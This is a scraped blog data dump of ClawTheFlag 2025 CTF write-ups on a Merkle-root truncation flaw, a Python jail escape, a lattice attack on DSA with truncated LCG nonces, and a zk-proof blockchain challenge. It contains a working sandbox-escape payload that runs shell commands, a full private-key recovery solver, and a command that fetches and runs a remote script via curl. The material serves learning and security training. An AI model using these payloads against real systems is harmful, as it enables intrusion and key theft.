transferFrom(address,address,uint256) 0x095ea7b3 - approve(address,uint256) 0x70a08231 - balanceOf(address) 0x18160ddd - totalSupply() Further Reading # OpenZeppelin MerkleProof Documentation Ethereum Yellow Paper - Keccak256 Solidity Types - bytes Solution Summary # # The vulnerability _merkleRoot = bytes4(_root) # Only 4 bytes stored! # The exploit secret = \u0026#34;transfer(address,uint256)\u0026#34; bytes4(keccak256(secret)) == 0xa9059cbb # Matches! # The attack mintInvite([], \u0026#34;transfer(address,uint256)\u0026#34;) Commands Cheat Sheet # # 1. Launch instance nc 13.61.1.167 31337 # Choose option 1 # 2. Solve PoW python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;CHALLENGE\u0026gt; 24 # 3. Run exploit python3 mint_nft.py # 4. Get flag nc 13.61.1.167 31337 # Choose option 3, enter UUID Flag # cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS} \u0026ldquo;Always check array lengths\u0026rdquo; - Don\u0026rsquo;t truncate your security!\nConclusion # This challenge demonstrates a critical but subtle vulnerability: truncating cryptographic values drastically weakens security. By storing only 4 bytes of the Merkle root instead of the standard 32 bytes, the contract reduced the search space from impossible (2^256) to feasible (2^32).\nThe challenge creator made it solvable by choosing 0xa9059cbb - the well-known ERC-20 transfer function selector - as a hint. This turned what could have been a brute-force exercise into a clever \u0026ldquo;aha!\u0026rdquo; moment when you recognize the value.\nKey lessons:\nAlways use full-width types for security-critical values (bytes32 not bytes4) Be extremely careful with type conversions and truncations Use well-audited libraries (OpenZeppelin) instead of rolling your own crypto Test edge cases like empty arrays Know your common Ethereum function selectors! ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/cybears-invite/","section":"Writeups","summary":"","title":"CybearsInvite - CTF Writeup","type":"writeups"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/cybersecurity/","section":"Tags","summary":"","title":"Cybersecurity","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/","section":"Deadnaut","summary":"","title":"Deadnaut","type":"page"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"Challenge Name: Prison\nCategory: Misc\nCTF: ClawTheFlag\nDifficulty: Medium\nDescription: Nothing to see here, just another pyjail\nConnection: ncat prison.ctf.clawtheflag.com 1337 --ssl\nInitial Analysis # Upon connecting to the server, we\u0026rsquo;re greeted with a Python jail prompt:\nWelcom to your good ol\u0026#39; pyjail! \u0026gt; The challenge provides a server.py file showing the jail implementation. Let\u0026rsquo;s analyze it.\nSource Code Analysis # import sys def hook(event, _): blacklist = [\u0026#34;import\u0026#34;, \u0026#34;ctypes\u0026#34;, \u0026#34;open\u0026#34;] if event in blacklist: print(f\u0026#34;Event not allowed: {event}\u0026#34;) exit() def check_code(code): banned_chars = [\u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;@\u0026#34;] banned_words = [ \u0026#34;builtins\u0026#34;, \u0026#34;breakpoint\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;attr\u0026#34;, \u0026#34;import\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;bases\u0026#34;, \u0026#34;f_back\u0026#34;, \u0026#34;traceback\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;license\u0026#34;, \u0026#34;help\u0026#34;, ] try: code.encode(\u0026#34;ascii\u0026#34;) except UnicodeEncodeError: return False for c in code: if c in banned_chars: return False for word in banned_words: if word in code.lower(): return False return True if __name__ == \u0026#34;__main__\u0026#34;: while True: print(\u0026#34;Welcom to your good ol\u0026#39; pyjail!\u0026#34;) inp = input(\u0026#34;\u0026gt; \u0026#34;) if not check_code(inp): print(\u0026#34;nope\u0026#34;) continue code = compile(inp, \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, \u0026#34;single\u0026#34;) sys.addaudithook(hook) try: exec(code, dict()) except: pass Key Restrictions # Banned Characters: [, ], g, @ Banned Words (case-insensitive): builtins, breakpoint, exec, eval, attr, import, class, bases f_back, traceback, globals, popen, license, help Audit Hook: Blocks import, ctypes, and open events Execution Context: Code runs in an empty dictionary (dict()), no globals provided Exploitation Strategy # Challenge #1: No Brackets # We can\u0026rsquo;t use [] for indexing or dictionary access, so we need to use:\nnext() with generator expressions .items(), .keys(), .values() for dictionary traversal Challenge #2: No \u0026ldquo;g\u0026rdquo; Character # This is particularly nasty because:\nCan\u0026rsquo;t use globals() (also banned word) Can\u0026rsquo;t use __getattribute__ or getattr Can\u0026rsquo;t access many useful attributes directly Challenge #3: Bypassing \u0026ldquo;builtins\u0026rdquo; Ban # We can construct the string dynamically:\nb = \u0026#34;__\u0026#34; + \u0026#34;built\u0026#34; + \u0026#34;ins\u0026#34; + \u0026#34;__\u0026#34; Challenge #4: Getting Code Execution # The audit hook blocks import, but there are modules already loaded! We need to:\nAccess __builtins__ (via string construction) Find a path to already-loaded modules Load additional modules without triggering import event Get os module to execute shell commands Solution Walkthrough # Step 1: Accessing __builtins__ # First, we construct the builtins string and access it from vars():\nb=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b) This gets us the __builtins__ dictionary without writing the banned word.\nStep 2: Exploring Available Modules # From builtins, we can access the open function, which gives us access to the _io module:\no=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__ Running print(dir(io)) reveals interesting attributes including __spec__.\nStep 3: Finding a Module Loader # The _io.__spec__.loader gives us a BuiltinImporter instance:\nL=io.__spec__.loader This loader has a load_module() method that can load built-in modules without triggering the audit hook\u0026rsquo;s import event!\nStep 4: Loading sys Module # s=L.load_module(\u0026#34;sys\u0026#34;) This successfully loads sys and we can now access sys.modules to see all loaded modules.\nStep 5: Getting os Module # The os module is already loaded in sys.modules! We iterate through it (avoiding g in dictionary access):\nos=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;) Step 6: Finding the Flag # List the filesystem to find the flag:\nos.system(\u0026#34;ls -la\u0026#34;) os.system(\u0026#34;find / -name \u0026#39;*fla*\u0026#39; 2\u0026gt;/dev/null\u0026#34;) This reveals /flag.txt exists.\nStep 7: Reading the Flag # os.system(\u0026#34;cat /fla?.txt\u0026#34;) We use ? wildcard to avoid typing g in \u0026ldquo;flag\u0026rdquo;.\nFinal Payload # The complete one-liner payload:\nb=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__; L=io.__spec__.loader; s=L.load_module(\u0026#34;sys\u0026#34;); os=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;); os.system(\u0026#34;cat /fla?.txt\u0026#34;) Execution # $ ncat prison.ctf.clawtheflag.com 1337 --ssl Welcom to your good ol\u0026#39; pyjail! \u0026gt; b=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__; L=io.__spec__.loader; s=L.load_module(\u0026#34;sys\u0026#34;); os=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;); os.system(\u0026#34;cat /fla?.txt\u0026#34;) Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms}0 Flag # Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms} Key Takeaways # Audit Hooks Are Not Sandboxes: As the flag suggests, Python\u0026rsquo;s audit hooks are meant for monitoring, not security enforcement. They can be bypassed.\nModule Loaders Bypass Import Events: Using load_module() from an existing loader doesn\u0026rsquo;t trigger the import audit event.\nString Construction Bypasses Word Filters: Simple string concatenation can bypass naive string-matching filters.\nGenerator Expressions \u0026gt; List Comprehension: When brackets are banned, generator expressions with next() are your friend.\nAlready-Loaded Modules: Python has many modules loaded by default (like os, sys, _io) that can be accessed without importing.\nAlternative Approaches # Other potential vectors that could work:\nUsing __loader__ from other built-in modules Accessing sys through exception tracebacks (but traceback is banned) Using __import__ (would trigger audit hook though) Leveraging other loaded modules like posix directly The key insight is finding a way to access already-loaded modules without triggering the audit hook, which the load_module() method accomplishes perfectly.\n","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/prison/","section":"Writeups","summary":"","title":"Prison - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Rng\nCategory: Cryptography\nCTF: ClawTheFlag\nDifficulty: Hard\nDescription: I love rng , who doesn\u0026rsquo;t ? (im lying)\nChallenge Overview # We\u0026rsquo;re given a DSA (Digital Signature Algorithm) implementation where the nonces are generated using a Linear Congruential Generator (LCG). However, there\u0026rsquo;s a critical vulnerability: the LCG outputs are truncated by discarding the lower 32 bits before being used as nonces.\nFiles Provided # src.sage - The challenge source code showing how signatures are generated import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import pad import os def gen_challenge(): q = random_prime(2^160 - 1, False, 2^159) t = 2^864 // q if t % 2 != 0: t += 1 while True: p = t * q + 1 if p.is_prime(): break t += 2 e = (p - 1) // q while True: h = randint(2, p - 1) g = power_mod(h, e, p) if g != 1: break x = randint(1, q - 1) y = power_mod(g, x, p) a = randint(2, q - 1) b = randint(1, q - 1) signatures = [] msgs = [b\u0026#34;Welcome to the challenge\u0026#34;, b\u0026#34;This is a signed message\u0026#34;, b\u0026#34;Hope U can Solve this\u0026#34;] state = randint(1, q - 1) hidden_bits = 32 mask = (1 \u0026lt;\u0026lt; hidden_bits) - 1 for msg in msgs: state = (a * state + b) % q k = state \u0026gt;\u0026gt; hidden_bits if k == 0: k = 1 m_hash = int(hashlib.sha1(msg).hexdigest(), 16) r = power_mod(g, k, p) % q if r == 0: continue k_inv = inverse_mod(k, q) s = (k_inv * (m_hash + x * r)) % q if s == 0: continue signatures.append({ \u0026#39;msg\u0026#39;: msg.decode(), \u0026#39;h\u0026#39;: m_hash, \u0026#39;r\u0026#39;: r, \u0026#39;s\u0026#39;: s }) FLAG = b\u0026#34;Cybears{REDACTED}\u0026#34; key = hashlib.sha256(str(x).encode()).digest() iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(FLAG, 16)) output = [] output.append(\u0026#34;=== Public Parameters ===\u0026#34;) output.append(f\u0026#34;p = {p}\u0026#34;) output.append(f\u0026#34;q = {q}\u0026#34;) output.append(f\u0026#34;g = {g}\u0026#34;) output.append(f\u0026#34;y = {y}\u0026#34;) output.append(f\u0026#34;a = {a}\u0026#34;) output.append(f\u0026#34;b = {b}\u0026#34;) output.append(\u0026#34;\u0026#34;) output.append(\u0026#34;=== Signatures ===\u0026#34;) for i, sig in enumerate(signatures): output.append(f\u0026#34;Msg {i}: {sig[\u0026#39;msg\u0026#39;]}\u0026#34;) output.append(f\u0026#34;r: {sig[\u0026#39;r\u0026#39;]}\u0026#34;) output.append(f\u0026#34;s: {sig[\u0026#39;s\u0026#39;]}\u0026#34;) output.append(\u0026#34;\u0026#34;) output.append(\u0026#34;=== Encrypted Flag ===\u0026#34;) output.append(f\u0026#34;iv = {iv.hex()}\u0026#34;) output.append(f\u0026#34;ciphertext = {ciphertext.hex()}\u0026#34;) with open(\u0026#34;out.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;\\n\u0026#34;.join(output)) if __name__ == \u0026#34;__main__\u0026#34;: gen_challenge() out.txt - Output file containing public parameters, three signatures, and an encrypted flag === Public Parameters === p = 123003155723136208567847447683223664415731869180715065944930703618254955521953492303010368693540149343822709050322214299552689203876695953600699775494388206142090885899729347827083318884583758435450548517566916661303540194105874846318704235833742951730395387893 q = 1351421998290697311075336828328868237101534073971 g = 33281778595201387261293626747615008705518327664613367247692358327331920321800338423029474043243916236688059227689255073131577344900473973707320419626540150438125115514005329631925252477669281215047423532322256514575254413979623373756671730097875278551744512292 y = 3307176365914197161077112919302114465012288764080495710556781650276230163105901770805655058452596531663862930554036441352621088291225804501623324989790865151454288524834303112917325796231214885559000730116030759472981610816425452002018684702872269406185707624 a = 1133017228114262159970528021801337885090356344787 b = 936311987844784871482813416133128695274329562672 === Signatures === Msg 0: Welcome to the challenge r: 915875771377874108142817390807358778656074043192 s: 702187177606022918474498802326245196106161318996 Msg 1: This is a signed message r: 399768373000447995442743550681355809407336352895 s: 1326361401622173194474654662518094360274404497842 Msg 2: Hope U can Solve this r: 1106708731356503672778052636855852639695964424325 s: 514444627373315433335058189992763090727319953242 === Encrypted Flag === iv = 084e4fb08250493e6fbbcbf4b16f31c8 ciphertext = e2ffb4339675cca22ae6770e68a26b0e5ae2421ca10cd597ce3a033f08083cfb642253d27ee29ae5ab928fed7816aae76e9ea4795a3bb91f5a9df08d1a1dd539 Analysis # The Vulnerability # Looking at the source code, we can identify the key vulnerability:\nstate = randint(1, q - 1) # Initial random state hidden_bits = 32 mask = (1 \u0026lt;\u0026lt; hidden_bits) - 1 for msg in msgs: state = (a * state + b) % q # LCG update k = state \u0026gt;\u0026gt; hidden_bits # Only use upper bits as nonce! # DSA signature generation r = power_mod(g, k, p) % q k_inv = inverse_mod(k, q) s = (k_inv * (m_hash + x * r)) % q The problem is that:\nNonces are predictable: They follow an LCG: state_i = (a * state_{i-1} + b) mod q Partial information leakage: Only the upper bits are used: k_i = state_i \u0026gt;\u0026gt; 32 Known LCG parameters: Both a and b are publicly revealed in the output Why This Is Exploitable # In standard DSA, if you can recover or predict the nonce k, you can recover the private key x from the signature equation:\ns = k^(-1) * (h + x * r) mod q =\u0026gt; x = (s * k - h) * r^(-1) mod q Here, we have:\nThree consecutive signatures using three consecutive LCG states The LCG parameters a and b are known Each nonce k_i is related to its state: k_i = state_i \u0026gt;\u0026gt; 32 This means state_i = k_i * 2^32 + u_i where u_i are the unknown lower 32 bits (0 ‚â§ u_i \u0026lt; 2^32).\nAttack Strategy # Step 1: Set Up the Problem # From the DSA signature equations, we know:\ns_i * k_i ‚â° h_i + x * r_i (mod q) Where k_i are the truncated nonces. Rearranging:\nk_i = (h_i + x * r_i) * s_i^(-1) (mod q) From the LCG relation:\nstate_{i+1} = a * state_i + b (mod q) Substituting state_i = k_i * B + u_i (where B = 2^32):\nk_{i+1} * B + u_{i+1} = a * (k_i * B + u_i) + b (mod q) Step 2: Eliminate the Private Key # To create a system independent of x, we combine two consecutive signature equations:\nFrom signatures 0 and 1:\nk_0 = (h_0 + x*r_0) * s_0^(-1) (mod q) k_1 = (h_1 + x*r_1) * s_1^(-1) (mod q) Substituting into the LCG equation and rearranging:\nx * (r_1*s_1^(-1)*B - a*r_0*s_0^(-1)*B) ‚â° a*h_0*s_0^(-1)*B - h_1*s_1^(-1)*B + b + (a*u_0 - u_1) (mod q) Let\u0026rsquo;s denote:\nA_01 = r_1*s_1^(-1)*B - a*r_0*s_0^(-1)*B (mod q) C_01 = a*h_0*s_0^(-1)*B - h_1*s_1^(-1)*B + b (mod q) Œ¥_01 = a*u_0 - u_1 Then: x * A_01 ‚â° C_01 + Œ¥_01 (mod q)\nSimilarly for signatures 1 and 2:\nx * A_12 ‚â° C_12 + Œ¥_12 (mod q) Step 3: Lattice Attack to Find Hidden Bits # For both equations to give the same x, we need:\nŒ¥_01 * A_12 - Œ¥_12 * A_01 ‚â° C_12*A_01 - C_01*A_12 (mod q) Expanding in terms of the hidden bits:\na*u_0*A_12 - u_1*(A_12 + a*A_01) + u_2*A_01 ‚â° target (mod q) This is a linear equation in small unknowns (u_0, u_1, u_2) where each u_i \u0026lt; 2^32. We can solve this using lattice reduction!\nWe construct a lattice where the short vector reveals the hidden bits:\nL = [ [q, 0, 0, 0], [a*A_12 mod q, 1, 0, 0], [-(A_12 + a*A_01) mod q, 0, 1, 0], [A_01 mod q, 0, 0, 1] ] Using LLL reduction and CVP (Closest Vector Problem) with Babai\u0026rsquo;s algorithm, we find the vector closest to (target, 0, 0, 0), which gives us (target, u_0, u_1, u_2).\nStep 4: Recover the Private Key # Once we have the hidden bits u_0, u_1, u_2, we can compute:\nx = (C_01 + a*u_0 - u_1) * A_01^(-1) (mod q) Step 5: Decrypt the Flag # The flag is encrypted with AES-CBC using a key derived from the private key:\nkey = SHA256(str(x)) Solution # Complete Solver Script # # Rng CTF Challenge Solver import hashlib # Parse the output file with open(\u0026#34;out.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) # Extract public parameters p = Integer(lines[1].split(\u0026#39; = \u0026#39;)[1]) q = Integer(lines[2].split(\u0026#39; = \u0026#39;)[1]) g = Integer(lines[3].split(\u0026#39; = \u0026#39;)[1]) y = Integer(lines[4].split(\u0026#39; = \u0026#39;)[1]) a = Integer(lines[5].split(\u0026#39; = \u0026#39;)[1]) # LCG parameter b = Integer(lines[6].split(\u0026#39; = \u0026#39;)[1]) # LCG parameter # Extract signatures (remember: 0-indexed) r1 = Integer(lines[10].split(\u0026#39;: \u0026#39;)[1]) s1 = Integer(lines[11].split(\u0026#39;: \u0026#39;)[1]) r2 = Integer(lines[14].split(\u0026#39;: \u0026#39;)[1]) s2 = Integer(lines[15].split(\u0026#39;: \u0026#39;)[1]) r3 = Integer(lines[18].split(\u0026#39;: \u0026#39;)[1]) s3 = Integer(lines[19].split(\u0026#39;: \u0026#39;)[1]) # Compute message hashes msgs = [b\u0026#34;Welcome to the challenge\u0026#34;, b\u0026#34;This is a signed message\u0026#34;, b\u0026#34;Hope U can Solve this\u0026#34;] h1 = Integer(int(hashlib.sha1(msgs[0]).hexdigest(), 16)) h2 = Integer(int(hashlib.sha1(msgs[1]).hexdigest(), 16)) h3 = Integer(int(hashlib.sha1(msgs[2]).hexdigest(), 16)) signatures = [(h1, r1, s1), (h2, r2, s2), (h3, r3, s3)] print(\u0026#34;=== LCG-DSA Attack ===\\n\u0026#34;) hidden_bits = 32 B = 2^hidden_bits # B = 2^32 n = 3 # Number of signatures h0, r0, s0 = signatures[0] h1, r1, s1 = signatures[1] h2, r2, s2 = signatures[2] # Compute modular inverses of signature values s0_inv = inverse_mod(s0, q) s1_inv = inverse_mod(s1, q) s2_inv = inverse_mod(s2, q) # Compute coefficients A and C for the linear system # For signatures 0-1: A_01 = (r1*s1_inv*B - a*r0*s0_inv*B) % q C_01 = (a*h0*s0_inv*B - h1*s1_inv*B + b) % q # For signatures 1-2: A_12 = (r2*s2_inv*B - a*r1*s1_inv*B) % q C_12 = (a*h1*s1_inv*B - h2*s2_inv*B + b) % q # Compute the target value for our lattice attack target = (C_12*A_01 - C_01*A_12) % q print(f\u0026#34;Target value: {target}\u0026#34;) print(f\u0026#34;Setting up lattice to solve for hidden bits...\\n\u0026#34;) # Build a 4x4 lattice to solve for (u_0, u_1, u_2) # We need: a*u_0*A_12 - u_1*(A_12 + a*A_01) + u_2*A_01 ‚â° target (mod q) dim = 4 L = Matrix(ZZ, dim, dim) L[0, 0] = q L[1, 0] = (a * A_12) % q L[1, 1] = 1 L[2, 0] = (-(A_12 + a*A_01)) % q L[2, 2] = 1 L[3, 0] = A_01 % q L[3, 3] = 1 # Apply LLL reduction print(\u0026#34;Applying LLL reduction...\u0026#34;) L_LLL = L.LLL() print(\u0026#34;LLL complete!\\n\u0026#34;) # Babai\u0026#39;s nearest plane algorithm for CVP def babai(L_LLL, target): \u0026#34;\u0026#34;\u0026#34;Find the closest lattice vector to target using Babai\u0026#39;s algorithm\u0026#34;\u0026#34;\u0026#34; G = L_LLL.gram_schmidt()[0] t_cur = target coeffs = [] for i in range(L_LLL.nrows()-1, -1, -1): c = (t_cur * G[i]) / (G[i] * G[i]) c = round(c) coeffs.insert(0, c) t_cur = t_cur - c * L_LLL[i] v = sum(coeffs[i] * L_LLL[i] for i in range(L_LLL.nrows())) return v # Solve CVP t = vector(ZZ, [target, 0, 0, 0]) closest = babai(L_LLL, t) print(f\u0026#34;Closest vector found: {closest}\\n\u0026#34;) # Extract the hidden bits from the solution u_0 = abs(closest[1]) u_1 = abs(closest[2]) u_2 = abs(closest[3]) print(f\u0026#34;Recovered hidden bits:\u0026#34;) print(f\u0026#34; u_0 = {u_0}\u0026#34;) print(f\u0026#34; u_1 = {u_1}\u0026#34;) print(f\u0026#34; u_2 = {u_2}\u0026#34;) # Verify they\u0026#39;re in valid range (\u0026lt; 2^32) if u_0 \u0026lt; B and u_1 \u0026lt; B and u_2 \u0026lt; B: print(\u0026#34;‚úì Hidden bits are valid!\\n\u0026#34;) # Compute the private key x delta_01 = (a*u_0 - u_1) % q x = ((C_01 + delta_01) * inverse_mod(A_01, q)) % q # Verify with the second equation delta_12 = (a*u_1 - u_2) % q x_check = ((C_12 + delta_12) * inverse_mod(A_12, q)) % q if x == x_check: print(\u0026#34;‚úì Private key verified with both equations!\u0026#34;) # Final verification: check all signatures and LCG relations print(\u0026#34;\\nVerifying all signatures and LCG relations...\u0026#34;) k_0 = ((h0 + x*r0) * inverse_mod(s0, q)) % q k_1 = ((h1 + x*r1) * inverse_mod(s1, q)) % q k_2 = ((h2 + x*r2) * inverse_mod(s2, q)) % q state_0 = k_0*B + u_0 state_1 = k_1*B + u_1 state_2 = k_2*B + u_2 # Check LCG relations lcg_check_1 = (a*state_0 + b) % q == state_1 lcg_check_2 = (a*state_1 + b) % q == state_2 if lcg_check_1 and lcg_check_2: print(\u0026#34;‚úì All LCG relations verified!\u0026#34;) print(\u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34;*50) print(\u0026#34;SUCCESS!\u0026#34;) print(\u0026#34;=\u0026#34;*50) print(f\u0026#34;\\nPrivate key (x): {x}\\n\u0026#34;) # Save the private key with open(\u0026#34;private_key.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(str(x)) print(\u0026#34;Private key saved to private_key.txt\u0026#34;) else: print(\u0026#34;‚úó LCG verification failed\u0026#34;) else: print(\u0026#34;‚úó Private key verification failed\u0026#34;) else: print(\u0026#34;‚úó Hidden bits out of valid range\u0026#34;) Decryption Script # # decrypt_flag.py import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # Read the recovered private key with open(\u0026#34;private_key.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: x = int(f.read().strip()) # Parse the encrypted flag from output file with open(\u0026#34;out.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) iv = bytes.fromhex(lines[22].split(\u0026#39; = \u0026#39;)[1]) ciphertext = bytes.fromhex(lines[23].split(\u0026#39; = \u0026#39;)[1]) # Derive the AES key from the private key key = hashlib.sha256(str(x).encode()).digest() # Decrypt the flag cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), 16) print(f\u0026#34;Flag: {plaintext.decode()}\u0026#34;) Running the Solution # # Run the Sage solver to recover the private key sage solve_final.sage # Decrypt the flag using the recovered key python3 decrypt_flag.py Flag # Cybears{lil_bit_truncated_lil_bit_signature_and_thats_the_flag} Key Takeaways # Never use predictable RNGs for cryptographic nonces: Even with a cryptographically secure LCG, truncating the output leaks information.\nBit truncation is dangerous: Discarding the lower 32 bits of a 160-bit value creates a Hidden Number Problem that can be solved with lattice techniques.\nLattice attacks are powerful: When you have linear equations with small unknowns over a modulus, lattice reduction (LLL) combined with CVP solving can recover those unknowns.\nDSA requires truly random nonces: Any bias, predictability, or partial information leakage in DSA nonces can lead to complete private key recovery.\nReferences # The Hidden Number Problem Lattice Attacks on DSA Schemes Recovering Cryptographic Keys from Partial Information LLL Algorithm ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/rng/","section":"Writeups","summary":"","title":"Rng - CTF Writeup","type":"writeups"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/categories/writeups/","section":"Categories","summary":"","title":"Writeups","type":"categories"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"Challenge Name: ZERO ZERO-Knowledge\nCategory: Blockchain\nCTF: ClawTheFlag\nDifficulty: Hard\nDescription: Zero description.\nConnection: nc 13.61.1.167 31338\nInitial Reconnaissance # The challenge provides minimal information - just a netcat connection. Let\u0026rsquo;s start by probing the service:\nnc 13.61.1.167 31338 Output:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? The service presents a menu with three options. Attempting option 1 triggers a Proof-of-Work challenge:\n== PoW == sha256(\u0026#34;7a39c8374cbb964e\u0026#34; + YOUR_INPUT) must start with 24 zeros in binary representation please run the following command to solve it: python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 7a39c8374cbb964e 24 This is a computational puzzle requiring us to find an input such that SHA256(nonce + input) produces a hash with 24 leading zero bits.\nUnderstanding the Service # The PoW serves as anti-spam protection. After solving it, the service proceeds with option 1:\nAfter solving PoW:\ndeploying your private blockchain... your private blockchain has been deployed it will automatically terminate in 30 minutes here\u0026#39;s some useful information uuid: 3f47d741-8ed5-483a-8dac-84cd538ddfd1 rpc endpoint: http://13.61.1.167:8546/3f47d741-8ed5-483a-8dac-84cd538ddfd1 private key: 0x54daf2395064a19fc4303b78e2d70f63fd8d8f11601fa05f786ee22fd6d21259 your address: 0x17Dff1Bd81CD02CC010948371a160Bd4EBC83B3d Excellent! The service:\nSpins up a private Ethereum blockchain (likely using Anvil/Hardhat) Provides us with: A unique UUID for our instance An HTTP RPC endpoint A funded private key Our Ethereum address The instance auto-terminates after 30 minutes, so we need to work efficiently.\nDeploying a Private Instance # To solve the PoW quickly, I implemented a Python brute-force solver:\ndef solve_pow(nonce: str, bits: int) -\u0026gt; str: i = 0 while True: candidate = str(i).encode() digest_hex = hashlib.sha256(nonce.encode() + candidate).hexdigest() if has_leading_zero_bits(digest_hex, bits): return candidate.decode() i += 1 def has_leading_zero_bits(hex_digest: str, bits: int) -\u0026gt; bool: bin_str = bin(int(hex_digest, 16))[2:].zfill(256) return bin_str.startswith(\u0026#34;0\u0026#34; * bits) With 24 bits of difficulty, this takes 2-50 seconds on average (expected ~16.7 million attempts).\nBlockchain Analysis # Once we have the RPC endpoint, let\u0026rsquo;s connect using Web3.py and explore:\nfrom web3 import Web3 w3 = Web3(Web3.HTTPProvider(rpc_url)) print(f\u0026#34;Chain ID: {w3.eth.chain_id}\u0026#34;) print(f\u0026#34;Latest block: {w3.eth.block_number}\u0026#34;) Result:\nChain ID: 31337 (standard Anvil/Hardhat test chain) Latest block: 3 Finding Deployed Contracts # The challenge must have deployed a contract. Let\u0026rsquo;s scan the blockchain:\ncontracts = [] for block_num in range(0, w3.eth.block_number + 1): block = w3.eth.get_block(block_num, full_transactions=True) for tx in block.transactions: receipt = w3.eth.get_transaction_receipt(tx.hash) if receipt.contractAddress: contracts.append(receipt.contractAddress) Found: One contract at 0xaE9F52994C6C60B63fE9f81a55a29b01cD59b6E9\nContract Reverse Engineering # Without the source code or ABI, we need to reverse-engineer the contract. Let\u0026rsquo;s extract function selectors from the bytecode:\ndef extract_selectors(bytecode: bytes) -\u0026gt; list: sels = [] i = 0 while i \u0026lt; len(bytecode): op = bytecode[i] i += 1 if op == 0x63 and i + 4 \u0026lt;= len(bytecode): # PUSH4 opcode selector = bytecode[i:i+4].hex() sels.append(selector) i += 4 elif 0x60 \u0026lt;= op \u0026lt;= 0x7f: # PUSH1-PUSH32 push_len = op - 0x5f i += push_len return list(dict.fromkeys(sels)) Extracted selectors:\n0x799320bb, 0x8da5cb5b, 0x98b0eff6, 0xafe42d92, 0xf8544bbd, 0x13416ae1, 0x19c813be, 0x36091dff, 0x64d98f6e, 0x43753b4d, 0xffffffff Identifying Functions with 4byte.directory # Using the 4byte.directory API to lookup selectors:\nSelector Function Signature 0x64d98f6e isSolved() 0x799320bb solved() 0x8da5cb5b owner() 0x43753b4d verifyProof(uint256[2],uint256[2][2],uint256[2],uint256[1]) 0x13416ae1 sanityCheck(uint256[2],uint256[2][2],uint256[2],uint256[1]) 0xafe42d92 solveMe(uint256[2],uint256[2][2],uint256[2],uint256[1],bytes32) 0x36091dff test(bool) Analysis:\nisSolved() / solved() - Check if challenge is solved verifyProof() / sanityCheck() - zk-SNARK proof verification (Groth16) solveMe() - Likely the intended solution requiring a valid proof test(bool) - Suspicious! A test function left in production code? The presence of Groth16 proof verification functions aligns with the challenge name \u0026ldquo;ZERO ZERO-Knowledge\u0026rdquo; - referencing zero-knowledge proofs.\nFinding the Vulnerability # Let\u0026rsquo;s test isSolved() first:\nisSolved_selector = Web3.keccak(text=\u0026#34;isSolved()\u0026#34;)[:4].hex() result = w3.eth.call({ \u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: \u0026#34;0x\u0026#34; + isSolved_selector }) solved = bool(int.from_bytes(result, byteorder=\u0026#34;big\u0026#34;)) print(f\u0026#34;Currently solved: {solved}\u0026#34;) # False The challenge expects us to generate a valid Groth16 zero-knowledge proof. However, creating such proofs requires:\nThe circuit definition Trusted setup parameters Valid witnesses Significant 